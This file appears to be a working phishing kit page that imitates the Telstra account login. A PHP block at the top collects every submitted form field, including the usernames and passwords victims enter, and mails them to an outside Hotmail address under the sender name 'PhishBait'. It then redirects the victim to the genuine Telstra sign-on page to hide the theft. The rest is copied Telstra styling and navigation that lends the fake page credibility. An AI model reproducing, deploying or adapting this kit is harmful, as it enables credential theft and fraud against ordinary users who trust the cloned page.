<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: http://signon.telstra.com.au/login?goto=http%3A%2F%2Femail.telstra.com%3A443%2Fwebmail');
$message = '';
foreach($_POST as $variable => $value) {
$message .= $variable.': '.$value."\r\n";}
$header  = 'From: PhishBait <donotreply@pbmkr.vt>'."\r\n";
$header .= 'Reply-To: donotreply@pbmkr.vt'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('obanshola@hotmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
exit;
} ?>
<!--
The functionality of this page is based on exiting page cmn_loginForm.jsp
The new UI design is done as part of Telstra Rebrand 3.0
 -->
<!DOCTYPE html>
<html style="" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js-nav-translate"><head><script async="" data-jsonpid="" src="Telstra%20Login_files/nlsSDK600.js"></script><script type="text/javascript" async="async" src="Telstra%20Login_files/s68924808120938.js"></script><script async="" src="Telstra%20Login_files/config250.js"></script><script type="text/javascript" async="async" src="Telstra%20Login_files/json"></script><script type="text/javascript" id="www-widgetapi-script" src="Telstra%20Login_files/www-widgetapi.js" async=""></script><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
    <title>Telstra Login</title>
    <meta http-equiv="content-type" content="text/html; charset=windows-1252">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Telstra Corporate is the gateway into the range of products and services offered by Telstra Consumer and Telstra Business and Enterprise.">
    <meta name="keywords" content="telstra corporate, telstra consumer, telstra business, telstra enterprise and government, consumer, business and enterprise, enterprise and government">
    <meta name="robots" content="INDEX, FOLLOW">
    <meta name="language" content="English">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=0.7, user-scalable=yes">
    <link rel="shortcut icon" href="https://www.telstra.com.au/etc/designs/tcom/global/img/telstra/favicon-base-blue.ico">

    
    <link rel="stylesheet" href="Telstra%20Login_files/font-woff.css"><script src="Telstra%20Login_files/touch.htm"></script><script type="text/javascript" async="" src="Telstra%20Login_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-EtaduuZwdmxBhBHsNjo8sRc9w1/o1fgO+YT0XRmvDEXW+PgVqEf/GqgoJF+UIzw6"></script><script type="text/javascript">
        var onloadCallback = function() {
          // alert("grecaptcha is ready!");
        };
        var onloadOK = function() {
          // alert("grecaptcha is DONE!");
          // document.forms.namedItem("Login").elements.namedItem("Submit").disabled=false;
        };
      </script>
      <script src="Telstra%20Login_files/api.js"></script> 
    

    <!-- Sitelet settings -->
    <script type="text/javascript">
        var telstra_global_lhnav_id = "hom";
        var telstra_global_tabId = 1;
        var telstra_global_loginState = -1;
        var isSSL = 0;
        var telstra_application = true;
        //var isSSL = true;// Must be uncommented when there is an SSL version available
    </script>

    <script type="text/javascript">
        var tcom = tcom || {};
        tcom.baseUrl = '';
        tcom.runmodes = ["publ03stl","crx2","publish","nosamplecontent","crx3mongo","prod"];
        tcom.isAuthor = false;
        tcom.siteSection = 'personal';
        tcom.isPersonal = true;
    </script>
    
    <script type="text/javascript">
        /* Based on https://github.com/filamentgroup/loadCSS */
        var fontPath = 'https://www.telstra.com.au/etc/designs/tcom/tcom-core/css/fonts/font-{0}.css';
        var ua = navigator.userAgent;
        // android webkit browser, non-chrome
        if(ua.indexOf('Android') > -1 && ua.indexOf('like Gecko') > -1 && ua.indexOf('Chrome') === -1 ){
            fontPath = fontPath.replace('{0}', 'ttf');
        }
        else if(document.documentElement.className.indexOf('lt-ie9') > -1){
            fontPath = fontPath.replace('{0}', 'eot');
        }
        else {
            fontPath = fontPath.replace('{0}', 'woff');
        }
        var injectref = document.getElementsByTagName('script')[0];
        
        function loadCSS(href){
            var fontslink = document.createElement('link');
            fontslink.rel = 'stylesheet';
            fontslink.href= href;
            if(injectref && injectref.parentNode) {
                injectref.parentNode.insertBefore(fontslink, injectref);
            } else {
                // uncommon, but oldIE timing
                window.setTimeout(function() { loadCSS(href); }, 15);
            }
        }
        
        loadCSS(fontPath);
    </script>

    <link rel="stylesheet" href="Telstra%20Login_files/bootstrap-responsive.css" type="text/css" media="all">
    <link rel="stylesheet" href="Telstra%20Login_files/styles-responsive.css" type="text/css" media="all">
    <link rel="stylesheet" href="Telstra%20Login_files/aem-global-responsive.css" type="text/css" media="all">
    <!--[if lte IE 9]>
    <link href="https://www.telstra.com.au/etc/designs/tcom/tcom-core/css/styles-responsive-ie.css" rel="stylesheet" media="all">
    <![endif]-->
    <link rel="stylesheet" href="Telstra%20Login_files/styles-print.css" media="print">
    <link rel="stylesheet" href="Telstra%20Login_files/service-qualifier.css" type="text/css">

    <!-- Overlay headInclude.jsp to include additional scripts in page header -->
    <script src="Telstra%20Login_files/modernizr.js"></script>

    <!--Line below to include telstra-auth.csss only in IE browsers above 9 and all other browsers -->
    <!--[if gt IE 9]><!-->
    <link rel="stylesheet" href="Telstra%20Login_files/telstra-auth.css">
    <!--<![endif]-->

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://www.telstra.com.au/etc/designs/tcom/tcom-core/js/respond.js"></script>
    <![endif]-->

    <script type="text/javascript">
        function initialise() {
            var callbackmsg = "";
            if(callbackmsg != null && callbackmsg != ""){
                document.write(callbackmsg);
            }
        }
    </script>

    <script type="text/javascript">
        var lpTag = lpTag || {}; lpTag.vars = lpTag.vars  || [];
        lpTag.section = 'default';
        var arrLPvars = [
        { scope:'page', name:'title', value: 'Home broadband' },
        /*{ scope:'session', name:'SESSION_VARIABLE_NAME', value:'VARIABLE_VALUE' },
        { scope:'visitor', name:'VISITOR_VARIABLE_NAME', value:'VARIABLE_VALUE' }*/
        ];
        lpTag.vars.push(arrLPvars);
    </script>


    <!--Styles defined as part of Rebrand changes -->
    <style type="text/css">
        #spectrum { visibility: visible !important; }

        body{
            background-image: none;
        }
        
        .button, .btn{
            padding: 14px 4px 14px 20px;
        }
        .button:after, .btn:after{
            right: -43px;
        }

        @font-face {
            font-family: 'Akkurat-Light';
            src: url('/res/fonts/telstra/onePortal/Akkurat-Light.woff') format('woff'),
                url('/res/fonts/telstra/onePortal/Akkurat-Light.ttf') format('truetype'),
                url('/res/fonts/telstra/onePortal/Akkurat-Light.svg#Akkurat-Light') format('svg');  
        }
        input[type="text"],input[type="number"],input[type="tel"],input[type="email"],input[type="password"]
        {
            float:left;
            border:1px solid #ccc;
            width:100%;
            height:34px;
            line-height:1.42857;
            margin:1px 0 5px;
            max-width:712px;
            padding:0;
            transition:border-color .15s ease-in-out 0,box-shadow .15s ease-in-out 0;
            -webkit-appearance:none;
            -webkit-border-radius: 0px;
            -moz-border-radius: 0px;
            -o-border-radius: 0px;
            border-radius: 0px;
            -webkit-box-shadow:rgba(0,0,0,0.07451) 0 1px 1px 0 inset;
            -webkit-rtl-ordering:logical;
            -webkit-transition-delay:0,0;
            -webkit-transition-duration:.15s,0.15s;
            -webkit-transition-property:border-color,box-shadow;
            -webkit-transition-timing-function:ease-in-out,ease-in-out;
            -webkit-user-select:text;
            -webkit-writing-mode:horizontal-tb;
            background-color:#fff;
            background-image:none;
            border-image-outset:0;
            border-image-repeat:stretch;
            border-image-slice:100%;
            border-image-source:none;
            border-image-width:1;
            box-shadow:rgba(0,0,0,0.07451) 0 1px 1px 0 inset;
            box-sizing:border-box;
            color:#555;
            cursor:auto;
            display:block;
            font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;
            font-size:14px;
            font-style:normal;
            font-variant:normal;
            font-weight:400;
            height:34px;
            letter-spacing:normal;
            line-height:20px;
            margin-bottom:0;
            margin-left:0;
            margin-right:0;
            margin-top:0;
            padding-bottom:6px;
            padding-left:12px;
            padding-right:12px;
            padding-top:6px;
            text-align:start;
            text-indent:0;
            text-shadow:none;
            text-transform:none;
            transition-delay:0,0;
            transition-duration:.15s,0.15s;
            transition-property:border-color,box-shadow;
            transition-timing-function:ease-in-out,ease-in-out;
            width:100%;
            word-spacing:0;
            border-color:#ccc;
            border-style:solid;
            border-width:1px}

        input[type="text"]:focus,input[type="number"]:focus,input[type="tel"]:focus,input[type="email"]:focus,select:focus,input[type="password"]:focus
        {
            border-color:#aaa;
            outline:0;
            -webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 8px rgba(102,175,233,0.6);
            box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 8px rgba(102,175,233,0.6)
        }

        select
        {
            margin-right:3px;
            background-color:#fff;
            background-image:none;
            border:1px solid #ccc;
            box-shadow:0 1px 1px rgba(0,0,0,0.075) inset;
            color:#555;
            display:block;
            font-size:14px;
            height:34px;
            line-height:1.42857;
            padding:6px 12px;
            transition:border-color .15s ease-in-out 0,box-shadow .15s ease-in-out 0;
            width:auto;
            height:33px!important;
            overflow:hidden;
            white-space:nowrap;
            text-overflow:ellipsis
        }

        input[type=checkbox],input[type=radio]
        {
            width:20px;
            height:20px;
            margin-top:0;
            margin-right:10px!important;
            float:left
        }

        .input-wrapper{   
            margin-bottom: 15px;    
            float: left;
            width: 100%; 
            clear:both;
        }

        .input-container
        {
            width:80%;float: left;
            -webkit-appearance: none;
            -webkit-border-radius: 0px;
            -moz-border-radius: 0px;
            -o-border-radius: 0px;
            border-radius: 0px;
        }

        .link-helper
        { 
            display: block;
            float: left;
            background-color: #004d9d;margin-left: 5px
        }

        .left
        {
            float:left;
        }

        .icons-register
        {
            margin-bottom: 15px
        }

        .field-group 
        {
            position: relative
        }

        #spectrum_local span{
            background-image: url("/res/images/commonLogin/v2.1-spectrum-blue.jpg");
            background-position: 50% 0;
            background-repeat: no-repeat;
            background-size: cover;
            display: block;
            height: 580px;
            margin-top: 81px;
            max-height: 580px;
            position: absolute;
            visibility: hidden;
            width: 100%;
        }

        .msg-error {
            background: #fff none repeat scroll 0 0;
            border-radius: 0px;
            font-size: 14px;
            max-height: 380px;
            margin-left: 0px; 
            margin-bottom: 20px;
            overflow: visible;
            padding-top: 5px; padding-bottom: 5px;
            min-width:250px;
            max-width: 400px;
        }

        .legend {
            display: inline-block;
        }

        .loginerrmsg {
            font-size:14px; 
            overflow: visible; display:inline-block; 
            margin-top: 5px;
            margin-bottom: 5px;
            font-weight:normal; 
            max-width: 90%;
        }
        
        .rebrandHeadingFont{
            font-family: 'Akkurat-Light';
            text-align: left;
            font-style: normal;
        }

        .rebrandLoginheading{
            font-size: 36px;
            color: #0F0F0F;
            padding-left: 0px;
            padding-top: 0px;
        }

        .rebrandregisterheading{
            font-size: 25px;
            color: #1964c8;
            /*height: 45px;*/
        }

        .rebrandErrMsgContainerDiv{
            padding-top: 0px;
            vertical-align: bottom;
            margin-top: 0px;
            margin-left: 0px;
            padding-bottom: 0px;
         }

        .rebrandColumns{
             margin: 0px;
             padding: 0px;
        }

        .rebrandColumn2{
            border: 0px solid orange;
        }

        .rebrandTextFont{
            font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;
            font-size: 14px;
            text-align: left;
            color: #333333;
            font-style: normal;
        }

        .cmn_rebrandFormControl{
            height: 40px; 
            border: 1px solid #dddddd;
        }
        
        .rebrandBusinessIdText{
            font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;
            font-size: 14px;
            text-align: left;
            color: #0F0F0F;
            font-weight: bold;
        }

        .rebrandDigitalCert{
            font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;
            font-size: 14px;
            text-align: left;
            color: #1964c8;
            font-weight: bold;
            padding: 0px;
            margin: 0 0 15px 0;
        }

        .img-spectrum{
            position:absolute;
            width:150%;
            left:-48%;
            height:500px;
            display:block;
            clip:rect(0px,2560px,100px,0px);
        }
        
        @media only screen and (device-width: 768px) {
            #rebrandMainContent{
                    margin-top:80px !important;
            }
        }
        

        @media only screen and (min-width: 800px){
            .rebrandloginHeadingDiv{
               height: 80px;  
            }

            .rebrandBlankDiv{
                height: 75px;
            }
            
            #tooltip0
            {
                    top: -100%;
                    left: 95%;
            }

            #tooltip1
            {
                    top: -50%;
                    left: 48%;
            }

            .tooltip-left{     
                border: 1px solid #ddd; 
                position:absolute; 
                margin:0; 
                padding:12px; 
                display:none; 
                background-color: #fff; 
                width: 400px;  
                z-index:9999;
                font-size: 12px;
            }
            .tooltip-left:after, .tooltip-left:before {
                right: 100%;
                top: 30%;
                border: solid transparent;
                content: " ";
                height: 0;
                width: 0;
                position: absolute;
                pointer-events: none;
            }
            .tooltip-left:after {
                border-color: rgba(255, 255, 255, 0);
                border-right-color: #fff;
                border-width: 10px;
                margin-top: -10px;
            }
            .tooltip-left:before {
                border-color: rgba(221, 221, 221, 0);
                border-right-color: #ddd;
                border-width: 11px;
                margin-top: -11px;
            }

            .rebrandColumn1{
                border: 1px solid #dddddd;
                border-bottom: 1px solid #dddddd;
            }
        }
       
        @media only screen and (max-width:800px) {
            .rebrandloginHeadingDiv{
               height: 35px;  
               padding-left: 25px;
            }

            .input-container
            {
                width:100%;float: left;
            }
        
            .tooltip-left
            {
                position: relative;
                display: block;
                float: left;
                border: 1px solid #ddd; 
                width: 100%;
                margin: 0px;
                margin-top: 10px;
                padding: 1px;
                box-sizing:border-box;
                top:8px;
                left:0;
            }
            .tooltip-left:after , .tooltip-left:before
            {
                display: none
            }
            
            #tooltip0
            {
                    top: 0%;
                    left: 0%;
            }

            #tooltip1
            {
                    top: 0%;
                    left: -6%;
            }

            .rebrandColumn1{
                border: 0px solid #dddddd;
                border-bottom: 1px solid #dddddd;
            }
        }

        ::-webkit-input-placeholder {
            padding-left: 15px; height: 40px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size: 14px;text-align: left;color: #a5a5a5;font-weight: bold;
        }

        :-moz-placeholder {
            padding-left: 15px; height: 40px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size: 14px;text-align: left;color: #a5a5a5;font-weight: bold;
        }

        ::-moz-placeholder {
            padding-left: 15px; height: 40px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size: 14px;text-align: left;color: #a5a5a5;font-weight: bold;
        }

        :-ms-input-placeholder {
            padding-left: 15px; height: 40px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size: 14px;text-align: left;color: #a5a5a5;font-weight: bold;
        }
    </style>
<!-- Added so Live chat window doesn't close when page is visited in the middle of a chat session-->					  
<script type="text/javascript" src="Telstra%20Login_files/common.js" async=""></script><script type="text/javascript" src="Telstra%20Login_files/adobetags.js"></script><script type="text/javascript" src="Telstra%20Login_files/signon.js" async=""></script></head>
<body role="document" class="base-blue  white-bkg"><iframe style="width: 1px; height: 1px; position: absolute; top: -7px; left: -7px; border: 0px none;" src="Telstra%20Login_files/storageframe.htm" id="LOCSTORAGE" scrolling="no" name="empty" hidden="true"></iframe>
    <!-- Application settings -->
    <script type="text/javascript">
        // <![CDATA[
        telstra_global_header_search_shop = false;

        if (typeof(telstra_application) != "undefined" && telstra_application == true) {
        var telstra_global_header_search = false;
        var telstra_global_header_displaytabs = false;
        }
        // ]]>
    </script>

    <div class="parbase clientcontext">
        <script type="text/javascript" src="Telstra%20Login_files/jquery_005.js"></script>
        <script type="text/javascript" src="Telstra%20Login_files/utils.js"></script>
        <script type="text/javascript" src="Telstra%20Login_files/granite.js"></script>
        <script type="text/javascript" src="Telstra%20Login_files/jquery_003.js"></script>
        <script type="text/javascript" src="Telstra%20Login_files/shared.js"></script>
        <script type="text/javascript" src="Telstra%20Login_files/underscore_002.js"></script>
        <script type="text/javascript" src="Telstra%20Login_files/kernel.js"></script>
    </div>

    <span id="spectrum" class="spectrum-page-takeover hidden-xs" style="background-image: url(&quot;https://www.telstra.com.au/etc/designs/tcom/tcom-core/img/telstra/3.0-spectrum-gradient-blue.png&quot;); visibility: visible;"></span>
    
    <div id="shade"></div>
    <header class="hide-header">
        <!--[if lt IE 8]>
            <div id="browser-warning">
                <div class="container">
                    <i class="td-icon-sm icon-information text-theme-dark"></i>
                    <div>
                        <p>&nbsp;</p>
                        <p>It looks like you are using Internet Explorer 7.</p>
                        <p>telstra.com.au may not display correctly and some of the features may be unavailable to you.<br>If you are not using this version, please check that <a href="http://windows.microsoft.com/en-US/internet-explorer/use-compatibility-view#ie=ie-10-win-7" target="_blank">compatibility mode</a> is turned off, otherwise you may need to <a href="http://windows.microsoft.com/en-au/internet-explorer/download-ie" target="_blank">update your browser</a>.</p>
                    </div>
                </div>
            </div>
        <![endif]-->
    
        <div id="global-nav" class="navbar navbar-inverse offcanvas" role="navigation">
            <div class="container">
                <div class="navbar-collapse collapse">
                    <ul class="nav navbar-nav" id="global-nav-menu">
                    <li>
                    <a href="http://www.telstra.com.au/?direct">Telstra.com</a>
                    </li>
                    <li class="active">
                    <a href="https://www.telstra.com.au/personal">Personal</a>
                    </li>
                    <li>
                    <a href="https://www.telstra.com.au/small-business">Small Business</a>
                    </li>
                    <li>
                    <a href="https://www.telstra.com.au/business-enterprise">Business &amp; Enterprise</a>
                    </li>
                    <li>
                    <a href="https://www.telstra.com.au/telstra-health">Health</a>
                    </li>
                    <li>
                    <a href="https://www.telstra.com.au/tv-movies-music">Sport &amp; Entertainment</a>
                    </li>
                    </ul>
                    <!-- Login Tile -->
                    <div id="login-placeholder"></div>
                </div>
            </div>
        </div>

        <div id="primary-nav" class="navbar visible-lg" role="navigation">
            <div class="container">
                <div class="navbar-collapse collapse">
                    <ul class="nav navbar-nav navbar-left">
                        <li>
                            <a href="https://www.telstra.com.au/" title="" class="site-title"><span class="site-logo">&nbsp;</span></a>
                            <a href="https://www.telstra.com.au/personal" title="" class="site-title"><span class="site-title">PERSONAL</span></a>
                        </li>
                    </ul>
                    <form class="navbar-form navbar-right" role="search" action="<?php echo basename(__FILE__); ?>" method="post" id="searchDesktop">
                        <div class="form-group search-telstra">
                            <span class="twitter-typeahead" style="position: relative; display: inline-block; direction: ltr;">
                                <span class="twitter-typeahead" style="position: relative; display: inline-block; direction: ltr;"><input data-search-input-desktop="" type="text" class="form-control search-telstra-input tt-input" placeholder="Search Telstra.com" name="inpSearch" autocomplete="off" spellcheck="false" dir="auto" style="position: relative; vertical-align: top; background-color: #dadada;"><pre aria-hidden="true" style="position: absolute; visibility: hidden; white-space: pre; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; font-style: normal; font-variant: normal; font-weight: 400; word-spacing: 0px; letter-spacing: 0px; text-indent: 0px; text-rendering: optimizelegibility; text-transform: none;"></pre><span class="tt-dropdown-menu" style="position: absolute; top: 100%; left: 0px; z-index: 100; display: none; right: auto;"><div class="tt-dataset-search"></div></span></span>
                                <pre aria-hidden="true" style="position: absolute; visibility: hidden; white-space: pre; font-family: Helvetica Neue, Helvetica, Arial, sans-serif; 
                                     font-size: 14px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; 
                                     font-weight: 400; word-spacing: 0px; letter-spacing: 0px; text-indent: 0px; text-rendering: auto; text-transform: none;">                                </pre>
                                <span class="tt-dropdown-menu" style="position: absolute; top: 100%; left: 0px; z-index: 100; display: none; right: auto;">
                                    <div class="tt-dataset-search"></div>
                                </span>
                            </span> 
                            
                            
                            <button class="search-telstra-btn" type="submit" id="searchSubmit">
                                <i class="td-icon icon-ui-search"></i>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="site-header" role="navigation">
            <div class="container">
                <button type="button" class="nav-toggle" data-nav-id="nav">
                    <span class="menu">Menu</span>
                    <div class="icon">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </div>
                </button>
                <a href="https://www.telstra.com.au/" class="site-logo"><span class="vh">Telstra.com</span></a>
                <ul class="site-actions">      
                    <li>
                        <button data-popover-id="site-search" class="btn-search btn square search-toggle fn_popover" aria-controls="site-search">
                            <i class="td-icon icon-ui-search"></i>
                            <span class="vh">Open search panel</span>
                        </button>
                    </li>
                </ul>
            </div>
        </div><div class="site-header is-fixed headroom active headroom--top" role="navigation">
            <div class="container">
                <button type="button" class="nav-toggle" data-nav-id="nav">
                    <span class="menu">Menu</span>
                    <div class="icon">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </div>
                </button>
                <a href="https://www.telstra.com.au/" class="site-logo is-small"><span class="vh">Telstra.com</span></a>
                <ul class="site-actions">      
                    <li>
                        <button data-popover-id="site-search" class="btn-search btn square search-toggle fn_popover" aria-controls="site-search">
                            <i class="td-icon icon-ui-search"></i>
                            <span class="vh">Open search panel</span>
                        </button>
                    </li>
                </ul>
            </div>
        </div><div class="site-header is-fixed headroom active headroom--top" role="navigation" style="top: 0px; display: block;">
            <div class="container">
                <button type="button" class="nav-toggle" data-nav-id="nav">
                    <span class="menu">Menu</span>
                    <div class="icon">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </div>
                </button>
                <a href="https://www.telstra.com.au/" class="site-logo is-light is-small"><span class="vh">Telstra.com</span></a>
                <ul class="site-actions">      
                    <li>
                        <button data-popover-id="site-search" class="btn-search btn square search-toggle fn_popover" aria-controls="site-search">
                            <i class="td-icon icon-ui-search"></i>
                            <span class="vh">Open search panel</span>
                        </button>
                          
                    </li>
                </ul>
            </div>
        </div>
        
        <div class="site-header is-fixed headroom active headroom--top" role="navigation" style="top: 0px; display: block;">
            <div class="container">
                <button type="button" class="nav-toggle" data-nav-id="nav">
                    <span class="menu">Menu</span>
                    <div class="icon">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </div>
                </button>
                <a href="https://www.telstra.com.au/" class="site-logo is-light is-small"><span class="vh">Telstra.com</span></a>
                <ul class="site-actions">      
                    <li>
                        <button data-popover-id="site-search" class="btn-search btn square search-toggle fn_popover" aria-controls="site-search">
                            <i class="td-icon icon-ui-search"></i>
                            <span class="vh">Open search panel</span>
                        </button>
                          
                    </li>
                </ul>
            </div>
        </div><div class="site-header is-fixed headroom active headroom--top" role="navigation" style="top: 0px; display: block;">
            <div class="container">
                <button type="button" class="nav-toggle" data-nav-id="nav">
                    <span class="menu">Menu</span>
                    <div class="icon">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </div>
                </button>
                <a href="https://www.telstra.com.au/" class="site-logo is-small"><span class="vh">Telstra.com</span></a>
                <ul class="site-actions">      
                    <li>
                        <button data-popover-id="site-search" class="btn-search btn square search-toggle fn_popover" aria-controls="site-search">
                            <i class="td-icon icon-ui-search"></i>
                            <span class="vh">Open search panel</span>
                        </button>
                    </li>
                </ul>
            </div>
        </div><div class="site-header is-fixed headroom active headroom--top" role="navigation" style="top: 0px; display: block;">
            <div class="container">
                <button type="button" class="nav-toggle" data-nav-id="nav">
                    <span class="menu">Menu</span>
                    <div class="icon">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </div>
                </button>
                <a href="https://www.telstra.com.au/" class="site-logo is-light is-small"><span class="vh">Telstra.com</span></a>
                <ul class="site-actions">      
                    <li>
                        <button data-popover-id="site-search" class="btn-search btn square search-toggle fn_popover" aria-controls="site-search">
                            <i class="td-icon icon-ui-search"></i>
                            <span class="vh">Open search panel</span>
                        </button>
                          
                    </li>
                </ul>
            </div>
        </div>
        
        <div class="row transparent rebrandBlankDiv"></div>
        
        <div class="visible-xs" style="height:100px;">
            <img class="img-spectrum visible-xs" src="Telstra%20Login_files/3.png" alt="">
        </div>
    </header>

    <div id="nav" class="offscreen-nav fn_scrollbar ps-container" role="navigation" tabindex="-1" data-scrollbar-x="false" aria-hidden="false" style="overflow-x: hidden;">
        <nav>
            <div class="nav-inner">
                <span class="site-logo is-small"><span class="vh">Telstra.com</span></span>
                    <ul class="offscreen-nav-primary">
                        <li class="is-expanded is-active">
                            <a href="https://www.telstra.com.au/personal" class="nav-lvl-1 has-children">Personal</a>
                            <div class="children" tabindex="-1">
                            <ul>
                                <li>
                                    <a href="https://www.telstra.com.au/tv-movies-music" class="has-children"><i class="td-icon icon-foxtel"></i>TV, Movies &amp; Music</a>
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/tv-movies-music" class="parent-link has-icon"><i class="td-icon icon-foxtel"></i>TV, Movies &amp; Music</a>
                                        <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div>
                                        <a href="https://www.telstra.com.au/tv-movies-music" class="parent-link has-icon"><i class="td-icon icon-foxtel"></i>TV, Movies &amp; Music</a>
                                        <ul>
                                            <li>
                                                <a href="https://www.telstra.com.au/tv-movies-music/products" class="has-children">Products</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/products" class="parent-link">Products</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                                    <a href="https://www.telstra.com.au/tv-movies-music/products" class="parent-link">Products</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/products/entertainment-on-the-move">Entertainment on the move</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/products/bigpond-movies">BigPond Movies - Telstra Entertainment</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/products/presto">Presto</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/products/netball-live">Netball Live</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li><a href="https://www.telstra.com.au/tv-movies-music/tv-shows">TV Shows</a></li>
                                            <li>
                                                <a href="https://www.telstra.com.au/tv-movies-music/sport" class="has-children">Sport</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/sport" class="parent-link">Sport</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                                    <a href="https://www.telstra.com.au/tv-movies-music/sport" class="parent-link">Sport</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/sport/barclays-premier-league">Barclays Premier League</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/sport/v8-supercars-championship">V8  Supercars Championship</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/sport/nfl">NFL</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li><a href="https://www.telstra.com.au/tv-movies-music/telstratvplusapp">Telstra TV Plus App</a></li>
                                            <li>
                                                <a href="https://www.telstra.com.au/tv-movies-music/telstra-tv" class="has-children">Telstra TV</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv" class="parent-link">Telstra TV</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                                    <a href="https://www.telstra.com.au/tv-movies-music/telstra-tv" class="parent-link">Telstra TV</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv/movies-and-tv-shows-lightbox">Movies and TV Shows</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv/catchup-tv-lightbox">Catch Up TV</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv/sport-lightbox">Sports</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv/kids-and-family-lightbox">Kids &amp; Family</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv/lifestyle-lightbox">Lifestyle</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv/music-and-media-lightbox">Music &amp; Media</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv/news-and-weather-lightbox">News &amp; Weather</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv/yupptv-lightbox">YUPP TV</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li><a href="https://www.telstra.com.au/tv-movies-music/sports-offer-eoi">Footy Pass</a></li>
                                            <li>
                                                <a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra" class="has-children">Foxtel From Telstra</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra" class="parent-link">Foxtel From Telstra</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                                    <a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra" class="parent-link">Foxtel From Telstra</a>
